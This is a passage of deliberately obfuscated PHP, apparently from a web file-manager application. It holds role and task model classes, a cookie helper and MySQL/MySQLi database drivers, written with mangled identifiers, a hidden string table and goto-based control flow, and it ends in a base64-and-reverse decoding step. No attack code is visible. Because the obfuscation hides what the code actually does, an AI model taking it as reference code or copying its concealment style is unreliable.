$ÉÁæ‰òî[400]; $ûìåŸ¼µ[$ÉÁæ‰òî[1818]] = 0; $ûìåŸ¼µ[$ÉÁæ‰òî[828]] = 0; } $”¯£õÛˆ = get_path_this($ç“Ì‚Ã”); if (strstr($”¯£õÛˆ, $ÉÁæ‰òî[20])) { $ûìåŸ¼µ[$ÉÁæ‰òî[1760]] += 1; $ûìåŸ¼µ[$ÉÁæ‰òî[1129]] += 1; } $ûìåŸ¼µ[$ÉÁæ‰òî[1811]] = $ç“Ì‚Ã”; $this->update(); } } goto FË–›®‹Ø‹; DÁèÄ §ğÊ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\x2e\162\157\x6c\145\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\141\x75\x74\x68", "\154\x61\x62\145\154", "\144\151\163\160\x6c\141\x79", "\163\171\x73\164\x65\155", "\x64\145\163\x63", "\x69\147\x6e\157\162\145\105\170\x74", "\151\147\156\157\162\x65\x46\x69\154\x65\x53\x69\172\145", "\141\144\x6d\151\156\x69\163\164\162\x61\x74\x6f\162", "\163\157\x72\x74"); public function listData($­Şúù×› = false, $åÃàİô° = "\163\x6f\162\x74", $ÂÈ™ÖŸ = false) { $Æ¯˜³‰  =& $_SERVER[ü¢ÙÊñÛ]; $ã¥ù®â = parent::listData($­Şúù×›, $åÃàİô°, $ÂÈ™ÖŸ); if (!$­Şúù×›) { foreach ($ã¥ù®â as $ô­Ùàª– => $¦ş®£ƒ) { if ($¦ş®£ƒ[$Æ¯˜³‰ [2167]] == 1) { $ã¥ù®â[$ô­Ùàª–][$Æ¯˜³‰ [537]] = LNG($Æ¯˜³‰ [2437]); } } } return $ã¥ù®â; } public function update($ı»¯è×’, $Õç®Û™¯) { $¸ğ¢ç† =& $_SERVER[ü¢ÙÊñÛ]; $ãôìˆÒÅ = parent::listData($ı»¯è×’); $ğá¶¦” = $this->findByName($Õç®Û™¯[$¸ğ¢ç†[42]]); if (!$ãôìˆÒÅ || $ğá¶¦” && $ğá¶¦”[$¸ğ¢ç†[486]] != $ãôìˆÒÅ[$¸ğ¢ç†[486]]) { return !1; } if ($ğá¶¦”[$¸ğ¢ç†[2167]] == 1) { $Õç®Û™¯ = array($¸ğ¢ç†[42] => $Õç®Û™¯[$¸ğ¢ç†[42]], $¸ğ¢ç†[1982] => $Õç®Û™¯[$¸ğ¢ç†[1982]]); } $this->filterAuth($Õç®Û™¯[$¸ğ¢ç†[498]]); return parent::update($ı»¯è×’, $Õç®Û™¯); } public function remove($íÊ°ïÜÀ) { $ˆÎ€×—ı = parent::listData($íÊ°ïÜÀ); if (!$ˆÎ€×—ı || $ˆÎ€×—ı[$_SERVER[ü¢ÙÊñÛ][202]]) { return !1; } return parent::remove($íÊ°ïÜÀ); } public function add($şİı´õÌ) { $‘›ÚÕ¥à =& $_SERVER[ü¢ÙÊñÛ]; $–³Ï¶òÂ = $şİı´õÌ[$‘›ÚÕ¥à[42]]; if ($this->findByName($–³Ï¶òÂ)) { return !1; } $Ì²—Ãßã = array($‘›ÚÕ¥à[505] => $–³Ï¶òÂ, $‘›ÚÕ¥à[1965] => $‘›ÚÕ¥à[22], $‘›ÚÕ¥à[1961] => $‘›ÚÕ¥à[1969], $‘›ÚÕ¥à[2438] => 1, $‘›ÚÕ¥à[1964] => 0, $‘›ÚÕ¥à[2439] => 0, $‘›ÚÕ¥à[1963] => $this->getSort()); $şİı´õÌ = array_merge($Ì²—Ãßã, $şİı´õÌ); $this->filterAuth($şİı´õÌ[$‘›ÚÕ¥à[498]]); return parent::insert($şİı´õÌ); } private function getSort() { $ºÈÉÜï =& $_SERVER[ü¢ÙÊñÛ]; $òê·½²á = parent::listData(); $‘½“²¸ = array_to_keyvalue($òê·½²á, $ºÈÉÜï[22], $ºÈÉÜï[1983]); return empty($‘½“²¸) ? 0 : max($‘½“²¸) + 1; } private function filterAuth(&$··§ê¥¦) { $İ„Î€£— =& $_SERVER[ü¢ÙÊñÛ]; $ªÅü…ñ = array(); $ì¦àÆÆ‰ = array_filter(explode($İ„Î€£—[60], $··§ê¥¦)); foreach ($ì¦àÆÆ‰ as $··§ê¥¦) { $ˆêùƒ‰Ï = explode($İ„Î€£—[20], $··§ê¥¦); if ($ˆêùƒ‰Ï[0] == $İ„Î€£—[2440] && $ˆêùƒ‰Ï[1] != $İ„Î€£—[1264]) { $Ùü—·ïÏ = $ˆêùƒ‰Ï[0] . $İ„Î€£—[20] . $ˆêùƒ‰Ï[1] . $İ„Î€£—[2441]; if (!in_array($Ùü—·ïÏ, $ì¦àÆÆ‰)) { $ªÅü…ñ[] = $Ùü—·ïÏ; } } $ªÅü…ñ[] = $··§ê¥¦; } $··§ê¥¦ = implode($İ„Î€£—[60], $ªÅü…ñ); } public function findRoleDefault() { $üÓ¦ßÆ± =& $_SERVER[ü¢ÙÊñÛ]; $çºÑ‚éŞ = parent::listData(); $îÁ‰ó®î = !1; foreach ($çºÑ‚éŞ as $ö•†öñ) { if (!$ö•†öñ || $ö•†öñ[$üÓ¦ßÆ±[1981]] == $üÓ¦ßÆ±[241] || $ö•†öñ[$üÓ¦ßÆ±[2167]] == 1) { continue; } if (strstr($ö•†öñ[$üÓ¦ßÆ±[498]], $üÓ¦ßÆ±[2442])) { continue; } if (!strstr($ö•†öñ[$üÓ¦ßÆ±[498]], $üÓ¦ßÆ±[2443])) { continue; } if (!$îÁ‰ó®î) { $îÁ‰ó®î = $ö•†öñ; continue; } $ú®›ùŸƒ = explode($üÓ¦ßÆ±[60], $îÁ‰ó®î[$üÓ¦ßÆ±[498]]); $‰çÙîÌØ = explode($üÓ¦ßÆ±[60], $ö•†öñ[$üÓ¦ßÆ±[498]]); if (count($ú®›ùŸƒ) > count($‰çÙîÌØ)) { $îÁ‰ó®î = $ö•†öñ; } } return $îÁ‰ó®î ? $îÁ‰ó®î[$üÓ¦ßÆ±[486]] : $üÓ¦ßÆ±[22]; } public function sort($Úö”Á¼Í, $¨øÆœøæ) { return parent::update($Úö”Á¼Í, $¨øÆœøæ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x74\x61\163\153\x4c\x69\163\164"; public $field = array("\156\141\155\x65", "\x74\171\160\145", "\145\x76\145\x6e\x74", "\x74\151\155\x65", "\x64\145\163\143", "\x73\171\163\164\145\155", "\x65\156\x61\142\154\x65", "\x6c\x61\163\x74\122\x75\x6e", "\163\157\x72\x74"); public function listData($İ´Öîìı = false, $ñ˜›„Í = "\163\157\x72\164", $ÜÕŞÖŠ = false) { return parent::listData($İ´Öîìı, $ñ˜›„Í, $ÜÕŞÖŠ); } public function add($™ãÊĞû´) { $–ìš£Í =& $_SERVER[ü¢ÙÊñÛ]; $µÍéó…’ = $this->findByName($™ãÊĞû´[$–ìš£Í[42]]); if ($µÍéó…’) { return !1; } $™ãÊĞû´[$–ìš£Í[1709]] = 0; $™ãÊĞû´[$–ìš£Í[1983]] = $this->getSort(); return parent::insert($™ãÊĞû´); } private function getSort() { $€““ê¨ =& $_SERVER[ü¢ÙÊñÛ]; $³·€¿­Œ = parent::listData(); $»…ğÆêŒ = array_to_keyvalue($³·€¿­Œ, $€““ê¨[22], $€““ê¨[1983]); return empty($»…ğÆêŒ) ? 0 : max($»…ğÆêŒ) + 1; } public function update($Ç¾—·, $¡š‰¸’Ú) { $´°à«Ù =& $_SERVER[ü¢ÙÊñÛ]; $ÅÀ‚ëş = $this->listData($Ç¾—·); $â™çÇÀˆ = $this->findByName($¡š‰¸’Ú[$´°à«Ù[42]]); if (!$ÅÀ‚ëş || $â™çÇÀˆ && $â™çÇÀˆ[$´°à«Ù[486]] != $ÅÀ‚ëş[$´°à«Ù[486]]) { return !1; } return parent::update($Ç¾—·, $¡š‰¸’Ú); } public function remove($ŠëåÅ›ù, $ğ˜à–›Å = false) { $úÖ“µèä =& $_SERVER[ü¢ÙÊñÛ]; $û†ş¤ = $this->listData($ŠëåÅ›ù); if (!$û†ş¤) { return; } if (!$ğ˜à–›Å && $û†ş¤[$úÖ“µèä[202]] == $úÖ“µèä[102]) { return !1; } return parent::remove($ŠëåÅ›ù); } public function enable($òÜ’‚æá, $¶ÀÄÛÒÛ) { return $this->update($òÜ’‚æá, array($_SERVER[ü¢ÙÊñÛ][2432] => $¶ÀÄÛÒÛ)); } public function run($Øı¼Ï›Ã) { return $this->update($Øı¼Ï›Ã, array($_SERVER[ü¢ÙÊñÛ][2444] => time())); } } goto cøÔ™ïî»ä; B¿”‘ÙÓÈ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ûú­ÛÏ— = '', $ìÌ†¦«¦ = 0) { if (is_string($ûú­ÛÏ—) && $ûú­ÛÏ— != $_SERVER[ü¢ÙÊñÛ][22]) { $this->prefix = $ûú­ÛÏ—; } if (is_numeric($ìÌ†¦«¦) && $ìÌ†¦«¦ > 0) { $this->expire = $ìÌ†¦«¦; } } public static function getInstance() { static $îÀóÚõ; if ($îÀóÚõ === null) { $îÀóÚõ = new self(); } return $îÀóÚõ; } private static $cookieDisable = false; public static function disable($´…½‰œË) { self::$cookieDisable = $´…½‰œË; } private static $sameCookieSet = array(); public static function set($·½¼şÀ†, $– ÷øæŸ, $ïì¨¶ÁÂ = 0, $†ä×¤¶ = false, $‡‹œœ–× = false) { $é®ÀË¶æ =& $_SERVER[ü¢ÙÊñÛ]; if (self::$cookieDisable) { return; } if (!$ïì¨¶ÁÂ) { $ïì¨¶ÁÂ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$·½¼şÀ†]) && self::$sameCookieSet[$·½¼şÀ†] == $– ÷øæŸ . $ïì¨¶ÁÂ) { return; } self::$sameCookieSet[$·½¼şÀ†] = $– ÷øæŸ . $ïì¨¶ÁÂ; if (!$‡‹œœ–×) { $‡‹œœ–× = str_replace(HOST, $é®ÀË¶æ[22], APP_HOST); $‡‹œœ–× = _get($GLOBALS, $é®ÀË¶æ[949], $‡‹œœ–×); } $Í²‘®·© = $é®ÀË¶æ[22]; setcookie($·½¼şÀ†, $– ÷øæŸ, time() + $ïì¨¶ÁÂ, $é®ÀË¶æ[18] . trim($‡‹œœ–×, $é®ÀË¶æ[18]) . $Í²‘®·©, !1, !1, $†ä×¤¶); } public static function setSafe($Î‰£Äâ, $õı÷€÷Ä, $üÅŞÒÒ = 0) { self::set($Î‰£Äâ, $õı÷€÷Ä, $üÅŞÒÒ, !0); } public static function get($²¯–éØø) { static $ùµèÂ— = false; if (!$ùµèÂ—) { self::initHeaderCookie(); $ùµèÂ— = !0; } return isset($_COOKIE[$²¯–éØø]) ? $_COOKIE[$²¯–éØø] : !1; } private static function initHeaderCookie() { $ı¶Ô¨™ø =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($_SERVER[$ı¶Ô¨™ø[950]]) || !$_SERVER[$ı¶Ô¨™ø[950]]) { return; } $ÔÁñ¿¸û = explode($ı¶Ô¨™ø[85], $_SERVER[$ı¶Ô¨™ø[950]]); foreach ($ÔÁñ¿¸û as $Ì¯âİıÎ) { $Ì¯âİıÎ = explode($ı¶Ô¨™ø[517], $Ì¯âİıÎ); if (count($Ì¯âİıÎ) != 2 || !isset($Ì¯âİıÎ[1])) { continue; } $_COOKIE[trim($Ì¯âİıÎ[0])] = trim($Ì¯âİıÎ[1]); } } public static function remove($Ğ¶°Ş­, $üºıŠî˜ = false) { unset($_COOKIE[$Ğ¶°Ş­]); self::set($Ğ¶°Ş­, $_SERVER[ü¢ÙÊñÛ][22], 1, $üºıŠî˜); } } class DbMysql extends Db { public function __construct($õÉ†ÃÊ = '') { $¼èôË’è =& $_SERVER[ü¢ÙÊñÛ]; if (!extension_loaded($¼èôË’è[870])) { think_exception(think_lang($¼èôË’è[24]) . $¼èôË’è[951]); } if (!empty($õÉ†ÃÊ)) { $this->config = $õÉ†ÃÊ; if (empty($this->config[$¼èôË’è[27]])) { $this->config[$¼èôË’è[27]] = $¼èôË’è[22]; } } } public function connect($­åë€ÁÂ = '', $¶îİ Ş– = 0, $¹ ÇÖÍñ = false) { $Ñá”á° =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->linkID[$¶îİ Ş–])) { if (empty($­åë€ÁÂ)) { $­åë€ÁÂ = $this->config; } $§ôÑ›¼ = $­åë€ÁÂ[$Ñá”á°[952]] . ($­åë€ÁÂ[$Ñá”á°[953]] ? "\x3a{$­åë€ÁÂ[$Ñá”á°[953]]}" : $Ñá”á°[22]); $Û ­¾Ù¥ = !empty($­åë€ÁÂ[$Ñá”á°[27]][$Ñá”á°[28]]) ? $­åë€ÁÂ[$Ñá”á°[27]][$Ñá”á°[28]] : $this->pconnect; if ($Û ­¾Ù¥) { $this->linkID[$¶îİ Ş–] = mysql_pconnect($§ôÑ›¼, $­åë€ÁÂ[$Ñá”á°[954]], $­åë€ÁÂ[$Ñá”á°[955]], 131072); } else { $this->linkID[$¶îİ Ş–] = mysql_connect($§ôÑ›¼, $­åë€ÁÂ[$Ñá”á°[954]], $­åë€ÁÂ[$Ñá”á°[955]], !0, 131072); } if (!$this->linkID[$¶îİ Ş–] || !empty($­åë€ÁÂ[$Ñá”á°[31]]) && !mysql_select_db($­åë€ÁÂ[$Ñá”á°[31]], $this->linkID[$¶îİ Ş–])) { think_exception(mysql_error()); } $ùÙÂµ‚³ = mysql_get_server_info($this->linkID[$¶îİ Ş–]); mysql_query($Ñá”á°[956] . think_config($Ñá”á°[957]) . $Ñá”á°[69], $this->linkID[$¶îİ Ş–]); if ($ùÙÂµ‚³ > $Ñá”á°[958]) { mysql_query($Ñá”á°[959], $this->linkID[$¶îİ Ş–]); } $this->connected = !0; if (1 != think_config($Ñá”á°[32])) { unset($this->config); } } return $this->linkID[$¶îİ Ş–]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($Äß®”åû) { $Îû³…Î =& $_SERVER[ü¢ÙÊñÛ]; if (0 === stripos($Äß®”åû, $Îû³…Î[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Äß®”åû; if ($this->queryID) { $this->free(); } think_action_status($Îû³…Î[33], 1); think_status($Îû³…Î[34]); $this->queryID = mysql_query($Äß®”åû, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($Šê½Ÿ¶Â) { $ôÖÎÆ»š =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Šê½Ÿ¶Â; if ($this->queryID) { $this->free(); } think_action_status($ôÖÎÆ»š[35], 1); think_status($ôÖÎÆ»š[34]); $ë§ñ­Ë‘ = mysql_query($Šê½Ÿ¶Â, $this->_linkID); $this->debug(); if (!1 === $ë§ñ­Ë‘) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ü¢ÙÊñÛ][960], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Ÿ…­¾˜è = mysql_query($_SERVER[ü¢ÙÊñÛ][961], $this->_linkID); $this->transTimes = 0; if (!$Ÿ…­¾˜è) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¢“şÆŸ‹ = mysql_query($_SERVER[ü¢ÙÊñÛ][962], $this->_linkID); $this->transTimes = 0; if (!$¢“şÆŸ‹) { $this->error(); return !1; } } return !0; } private function getAll() { $ğÔƒİ• = array(); if ($this->numRows > 0) { while ($Åƒ˜úºù = mysql_fetch_assoc($this->queryID)) { $ğÔƒİ•[] = $Åƒ˜úºù; } mysql_data_seek($this->queryID, 0); } return $ğÔƒİ•; } public function getFields($§æå›ş‹) { $‡”‹®Ô =& $_SERVER[ü¢ÙÊñÛ]; $‰æ‰Ã = $this->query($‡”‹®Ô[963] . $this->parseKey($§æå›ş‹)); $ßñÊ¯Éœ = array(); if ($‰æ‰Ã) { foreach ($‰æ‰Ã as $×³‡¥À => $Œ½ü½¨÷) { $ßñÊ¯Éœ[$Œ½ü½¨÷[$‡”‹®Ô[41]]] = array($‡”‹®Ô[42] => $Œ½ü½¨÷[$‡”‹®Ô[41]], $‡”‹®Ô[43] => $Œ½ü½¨÷[$‡”‹®Ô[44]], $‡”‹®Ô[45] => (bool) (strtoupper($Œ½ü½¨÷[$‡”‹®Ô[46]]) === $‡”‹®Ô[964]), $‡”‹®Ô[47] => $Œ½ü½¨÷[$‡”‹®Ô[48]], $‡”‹®Ô[49] => strtolower($Œ½ü½¨÷[$‡”‹®Ô[50]]) == $‡”‹®Ô[51], $‡”‹®Ô[52] => strtolower($Œ½ü½¨÷[$‡”‹®Ô[53]]) == $‡”‹®Ô[54]); } } return $ßñÊ¯Éœ; } public function getTables($³È§ŸäÑ = '') { $ÎÅ¶Ğ’ =& $_SERVER[ü¢ÙÊñÛ]; if (!empty($³È§ŸäÑ)) { $øÒê¹Ïœ = $ÎÅ¶Ğ’[965] . $³È§ŸäÑ . $ÎÅ¶Ğ’[966]; } else { $øÒê¹Ïœ = $ÎÅ¶Ğ’[967]; } $Ö»±š›½ = $this->query($øÒê¹Ïœ); $ÊÄÆÁ¿˜ = array(); foreach ($Ö»±š›½ as $ß‡õ±ş  => $»ùŞìşş) { $ÊÄÆÁ¿˜[$ß‡õ±ş ] = current($»ùŞìşş); } return $ÊÄÆÁ¿˜; } public function replace($šâ¥ï—, $ù£é„ı = array()) { $öÎÄÇŞü =& $_SERVER[ü¢ÙÊñÛ]; foreach ($šâ¥ï— as $ûœŞšÊô => $ÔëóåÖñ) { $»ö›­Ã¾ = $this->parseValue($ÔëóåÖñ); if (is_scalar($»ö›­Ã¾)) { $–õÏÌïØ[] = $»ö›­Ã¾; $Ù„¥òÛ°[] = $this->parseKey($ûœŞšÊô); } } $´ÉšĞãœ = $öÎÄÇŞü[968] . $this->parseTable($ù£é„ı[$öÎÄÇŞü[368]]) . $öÎÄÇŞü[969] . implode($öÎÄÇŞü[60], $Ù„¥òÛ°) . $öÎÄÇŞü[970] . implode($öÎÄÇŞü[60], $–õÏÌïØ) . $öÎÄÇŞü[971]; return $this->execute($´ÉšĞãœ); } public function insertAll($ËÂàê„, $Êú¿û = array(), $µ°èÆëô = false) { $ûÛÈñ“¹ =& $_SERVER[ü¢ÙÊñÛ]; if (!is_array($ËÂàê„[0])) { return !1; } $±şáö = array_keys($ËÂàê„[0]); $Œà‡ƒÕ = array(); foreach ($ËÂàê„ as $òÔ²Ôóˆ) { $ÁÉ’Ì¸ = array(); foreach ($òÔ²Ôóˆ as $øİŠ¥°¤ => $†Ô¯áÕ) { $†Ô¯áÕ = $this->parseValue($†Ô¯áÕ); if (is_scalar($†Ô¯áÕ)) { $ÁÉ’Ì¸[] = $†Ô¯áÕ; } } $Œà‡ƒÕ[] = $ûÛÈñ“¹[349] . implode($ûÛÈñ“¹[60], $ÁÉ’Ì¸) . $ûÛÈñ“¹[971]; } array_walk($±şáö, array($this, $ûÛÈñ“¹[972])); $³ĞÄñË = ($µ°èÆëô ? $ûÛÈñ“¹[973] : $ûÛÈñ“¹[974]) . $ûÛÈñ“¹[975] . $this->parseTable($Êú¿û[$ûÛÈñ“¹[368]]) . $ûÛÈñ“¹[969] . implode($ûÛÈñ“¹[60], $±şáö) . $ûÛÈñ“¹[976] . implode($ûÛÈñ“¹[60], $Œà‡ƒÕ); return $this->execute($³ĞÄñË); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ôú»œÄ¶ =& $_SERVER[ü¢ÙÊñÛ]; $this->error = mysql_errno() . $Ôú»œÄ¶[14] . mysql_error($this->_linkID); if ($Ôú»œÄ¶[22] != $this->queryStr) { $this->error .= LNG($Ôú»œÄ¶[58]) . $this->queryStr; } think_trace($this->error, $Ôú»œÄ¶[22], $Ôú»œÄ¶[59]); return $this->error; } public function escapeString($¹¿“Øü) { if ($this->_linkID) { return mysql_real_escape_string($¹¿“Øü, $this->_linkID); } else { return mysql_escape_string($¹¿“Øü); } } public function parseKey(&$…È½•é, $ş­ ğ¿â = true) { $¡«æã„› =& $_SERVER[ü¢ÙÊñÛ]; if ($ş­ ğ¿â) { $…È½•é = $this->parseKeyCheck($…È½•é); } if ($…È½•é != $¡«æã„›[233] && !preg_match($¡«æã„›[977], $…È½•é)) { $…È½•é = $¡«æã„›[472] . trim($…È½•é, $¡«æã„›[472]) . $¡«æã„›[472]; } return $…È½•é; } } class DbMysqli extends Db { public function __construct($ ™Æˆöû = '') { $¼Øöş½ß =& $_SERVER[ü¢ÙÊñÛ]; if (!extension_loaded($¼Øöş½ß[978])) { think_exception(think_lang($¼Øöş½ß[24]) . $¼Øöş½ß[979]); } if (!empty($ ™Æˆöû)) { $this->config = $ ™Æˆöû; if (empty($this->config[$¼Øöş½ß[27]])) { $this->config[$¼Øöş½ß[27]] = $¼Øöş½ß[22]; } } } public function connect($ê÷ÉØùË = '', $›øï£Ö¯ = 0) { $Â£Ô¨¼Æ =& $_SERVER[ü¢ÙÊñÛ]; if (!isset($this->linkID[$›øï£Ö¯])) { if (empty($ê÷ÉØùË)) { $ê÷ÉØùË = $this->config; } $this->linkID[$›øï£Ö¯] = new mysqli($ê÷ÉØùË[$Â£Ô¨¼Æ[952]], $ê÷ÉØùË[$Â£Ô¨¼Æ[954]], $ê÷ÉØùË[$Â£Ô¨¼Æ[955]], $ê÷ÉØùË[$Â£Ô¨¼Æ[31]], $ê÷ÉØùË[$Â£Ô¨¼Æ[953]] ? intval($ê÷ÉØùË[$Â£Ô¨¼Æ[953]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ø¼—ŞÀ† = $this->linkID[$›øï£Ö¯]->server_version; $this->linkID[$›øï£Ö¯]->query($Â£Ô¨¼Æ[956] . think_config($Â£Ô¨¼Æ[957]) . $Â£Ô¨¼Æ[69]); if ($Ø¼—ŞÀ† > $Â£Ô¨¼Æ[958]) { $this->linkID[$›øï£Ö¯]->query($Â£Ô¨¼Æ[959]); } $this->connected = !0; if (1 != think_config($Â£Ô¨¼Æ[32])) { unset($this->config); } } return $this->linkID[$›øï£Ö¯]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¶”™™) { $ÑØÑõàò =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¶”™™; if ($this->queryID) { $this->free(); } think_action_status($ÑØÑõàò[33], 1); think_status($ÑØÑõàò[34]); $this->queryID = $this->_linkID->query($¶”™™); if ($this->_linkID->more_results()) { while (($‡‚Á‡… = $this->_linkID->next_result()) != NULL) { $‡‚Á‡…->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($µßâİ‘ı) { $ğİÒ‚à =& $_SERVER[ü¢ÙÊñÛ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µßâİ‘ı; if ($this->queryID) { $this->free(); } think_action_status($ğİÒ‚à[35], 1); think_status($ğİÒ‚à[34]); $¥í¦áñÅ = $this->_linkID->query($µßâİ‘ı); $this->debug(); if (!1 === $¥í¦áñÅ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ŸıÅÔ¢« = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ŸıÅÔ¢«) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ûÃ­ÙéÅ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ûÃ­ÙéÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $Š´ÜØÈ¼ = array(); if ($this->numRows > 0) { for ($§îˆ÷Â¦ = 0; $§îˆ÷Â¦ < $this->numRows; $§îˆ÷Â¦++) { $Š´ÜØÈ¼[$§îˆ÷Â¦] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $Š´ÜØÈ¼; } public function getFields($ˆ»÷®²ˆ) { $´şÖ¸™½ =& $_SERVER[ü¢ÙÊñÛ]; $†Ÿ·óõ = $this->query($´şÖ¸™½[963] . $this->parseKey($ˆ»÷®²ˆ)); $æÎß¸â¿ = array(); if ($†Ÿ·óõ) { foreach ($†Ÿ·óõ as $å«™åû§ => $·îÄ…¥‡) { $æÎß¸â¿[$·îÄ…¥‡[$´şÖ¸™½[41]]] = array($´şÖ¸™½[42] => $·îÄ…¥‡[$´şÖ¸™½[41]], $´şÖ¸™½[43] => $·îÄ…¥‡[$´şÖ¸™½[44]], $´şÖ¸™½[45] => (bool) ($·îÄ…¥‡[$´şÖ¸™½[46]] === $´şÖ¸™½[22]), $´şÖ¸™½[47] => $·îÄ…¥‡[$´şÖ¸™½[48]], $´şÖ¸™½[49] => strtolower($·îÄ…¥‡[$´şÖ¸™½[50]]) == $´şÖ¸™½[51], $´şÖ¸™½[52] => strtolower($·îÄ…¥‡[$´şÖ¸™½[53]]) == $´şÖ¸™½[54]); } } return $æÎß¸â¿; } public function getTables($éˆûºõ¢ = '') { $ãÒ—ÎË¨ =& $_SERVER[ü¢ÙÊñÛ]; $ôÅ‰ãÌ¯ = !empty($éˆûºõ¢) ? $ãÒ—ÎË¨[965] . $éˆûºõ¢ . $ãÒ—ÎË¨[966] : $ãÒ—ÎË¨[967]; $’ŠÍ¤Ü = $this->query($ôÅ‰ãÌ¯); $æ®Š‹Œü = array(); if ($’ŠÍ¤Ü) { foreach ($’ŠÍ¤Ü as $õ¼€Âúï => $¹¾¦•) { $æ®Š‹Œü[$õ¼€Âúï] = current($¹¾¦•); } } return $æ®Š‹Œü; } public function replace($Ààı¼Ñ„, $ÁìÎÍ™Œ = array()) { $œíÁ±Çş =& $_SERVER[ü¢ÙÊñÛ]; foreach ($Ààı¼Ñ„ as $¬²¦Ç¾ => $§É¢êòÍ) { $ŞÈ’ê¨É = $this->parseValue($§É¢êòÍ); if (is_scalar($ŞÈ’ê¨É)) { $ø¨ˆ§ƒ‰[] = $ŞÈ’ê¨É; $Œ²ùÙŠ¦[] = $this->parseKey($¬²¦Ç¾); } } $Ú‹ÑÙÁà = $œíÁ±Çş[968] . $this->parseTable($ÁìÎÍ™Œ[$œíÁ±Çş[368]]) . $œíÁ±Çş[969] . implode($œíÁ±Çş[60], $Œ²ùÙŠ¦) . $œíÁ±Çş[970] . implode($œíÁ±Çş[60], $ø¨ˆ§ƒ‰) . $œíÁ±Çş[971]; return $this->execute($Ú‹ÑÙÁà); } public function insertAll($çøÂÌÉø, $”‘¿ÉÚâ = array(), $íáĞ½Ï = false) { $ûó¶è…– =& $_SERVER[ü¢ÙÊñÛ]; if (!is_array($çøÂÌÉø[0])) { return !1; } $Ë°ĞË† = array_keys($çøÂÌÉø[0]); $‘Àú®· = array(); foreach ($çøÂÌÉø as $Ø²ÒÒ à) { $„é ©ÒŞ = array(); foreach ($Ø²ÒÒ à as $“ƒ’Şğú => $ôÉÒ) { $ôÉÒ = $this->parseValue($ôÉÒ); if (is_scalar($ôÉÒ)) { $„é ©ÒŞ[] = $ôÉÒ; } } $‘Àú®·[] = $ûó¶è…–[349] . implode($ûó¶è…–[60], $„é ©ÒŞ) . $ûó¶è…–[971]; } array_walk($Ë°ĞË†, array($this, $ûó¶è…–[972])); $€†‡ˆ™ñ = $íáĞ½Ï ? $ûó¶è…–[973] : $ûó¶è…–[974]; $ÃÂÙÏä¬ = $€†‡ˆ™ñ . $ûó¶è…–[975] . $this->parseTable($”‘¿ÉÚâ[$ûó¶è…–[368]]) . $ûó¶è…–[969] . implode($ûó¶è…–[60], $Ë°ĞË†) . $ûó¶è…–[976] . implode($ûó¶è…–[60], $‘Àú®·); return $this->execute($ÃÂÙÏä¬); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‚¾Õ±ğÜ =& $_SERVER[ü¢ÙÊñÛ]; $this->error = $this->_linkID->errno . $‚¾Õ±ğÜ[14] . $this->_linkID->error; if ($‚¾Õ±ğÜ[22] != $this->queryStr) { $this->error .= LNG($‚¾Õ±ğÜ[58]) . $this->queryStr; } think_trace($this->error, $‚¾Õ±ğÜ[22], $‚¾Õ±ğÜ[59]); return $this->error; } public function escapeString($”·íúÉ¨) { if ($this->_linkID) { return $this->_linkID->real_escape_string($”·íúÉ¨); } else { return addslashes($”·íúÉ¨); } } public function parseKey(&$°Ş„€ãÕ, $‹ÓµÔÀ = true) { $’¾íÒ›¹ =& $_SERVER[ü¢ÙÊñÛ]; if ($‹ÓµÔÀ) { $°Ş„€ãÕ = $this->parseKeyCheck($°Ş„€ãÕ); } if ($°Ş„€ãÕ != $’¾íÒ›¹[233] && !preg_match($’¾íÒ›¹[977], $°Ş„€ãÕ)) { $°Ş„€ãÕ = $’¾íÒ›¹[472] . trim($°Ş„€ãÕ, $’¾íÒ›¹[472]) . $’¾íÒ›¹[472]; } return $°Ş„€ãÕ; } } goto Dœ‚¦¼ï¸ğ; E×¸‚¥¿íÄ: $fileSize = strrev(base64_decode($_SERVER[³ñ±ª˜‘][0])); function binCheckNeq($ªÅ£“¤ª, $Ş£ÅÎ„·) { return $ªÅ£“¤ª != $Ş£ÅÎ„·; } 